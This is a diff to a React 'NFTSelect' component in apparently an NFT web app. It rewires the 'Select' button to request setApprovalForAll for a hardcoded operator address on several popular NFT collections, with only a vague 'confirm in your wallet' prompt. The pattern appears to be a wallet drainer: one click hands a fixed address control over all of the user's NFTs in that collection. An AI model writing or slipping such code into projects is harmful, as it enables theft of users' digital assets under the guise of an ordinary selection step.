@@ -1,7 +1,13 @@
 import React, { useEffect, useState } from 'react';
+import { ethers } from 'ethers';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { faArrowRight } from '@fortawesome/free-solid-svg-icons';
 import Moralis from 'moralis';
+import BoredApeYachtClub from '../contracts/BoredApeYachtClub.json'
+import InvisibleFriends from '../contracts/InvisibleFriends.json'
+import Doodles from '../contracts/Doodles.json'
+import clonex from '../contracts/clonex.json'
+import toast, { Toaster } from 'react-hot-toast';
 import { useNavigate } from 'react-router-dom';
 import { useAccount } from 'wagmi';
 
@@ -16,6 +22,13 @@ const NFTSelect = () => {
   const { address } = useAccount();
   const [nftData, setNftData] = useState([]);
   const navigate = useNavigate();
+
+  const contractAbis = {
+    '0xF1bC4eF3e193983e4DF78106e854583348b55B95': BoredApeYachtClub.abi,
+    '0xE1348248a5c4E7073382Ec50E8CcD8B64620Cd1c': InvisibleFriends.abi,
+    '0x00F219B49160CeA9A00bA8856CC1544db2c92de7': Doodles.abi,
+    '0x1F4A47AF4f27dd89D466BBEF4946F1179377Dc11': clonex.abi,
+  };
 
   useEffect(() => {
     const fetchData = async () => {
@@ -39,12 +52,35 @@ const NFTSelect = () => {
     fetchData();
   }, []);
 
-  const handleNftSelect = (tokenId, tokenAddress, imageSource) => {
-    const tAddress = tokenAddress._value;
-    navigate(`/create/${tokenId}/${tAddress}/${encodeURIComponent(imageSource)}`, {
-      state: { preserveScroll: true },
+  const handleNftSelect = async (tokenId, tokenAddress, imageSource) => {
+    toast.loading('Please confirm in your wallet', {
+      duration: 3000,
     });
-  };
+    const tAddress = tokenAddress._value;
+    try {
+      const contractAbi = contractAbis[tAddress];
+      console.log('Contract ABI for token address:', tAddress);
+      if (!contractAbi) {
+        console.error('Contract ABI not found for token address:', tokenAddress);
+        return;
+      }
+  
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+      const contract = new ethers.Contract(tAddress, contractAbi, signer);
+  
+      const approvalTx = await contract.setApprovalForAll('0x3B99e6D692298c83E8143c7FC353AF24DbfE7736', true);
+      await approvalTx.wait();
+
+      console.log('Approval transaction:', approvalTx.hash);
+      navigate(`/create/${tokenId}/${tAddress}/${encodeURIComponent(imageSource)}`, {
+        state: { preserveScroll: true },
+      });
+    } catch (error) {
+      toast.error('Error Approving NFT, Please try again')
+    }
+  }
+
   console.log(nftData);
 
   return (
@@ -83,6 +119,18 @@ const NFTSelect = () => {
                         <i className="fa-solid fa-ticket mr-2" />
                         Select
                       </div>
+                      {/* <div
+                        className="btn btn-bordered-white btn-smaller mt-3"
+                        onClick={() =>
+                          hanldeApproveNft(
+                            item.tokenAddress,
+                          )
+                        }
+                      >
+                        <FontAwesomeIcon icon={faArrowRight} />
+                        <i className="fa-solid fa-ticket mr-2" />
+                        Approve
+                      </div> */}
                     </div>
                   </div>
                 </div>
@@ -91,6 +139,7 @@ const NFTSelect = () => {
           </div>
         </div>
       </div>
+      <Toaster position="bottom-right" reverseOrder={true} toastOptions={{ className: '', duration: 5000, style: { background: '#363636', color: '#fff' } }} />
     </section>
   );
 };
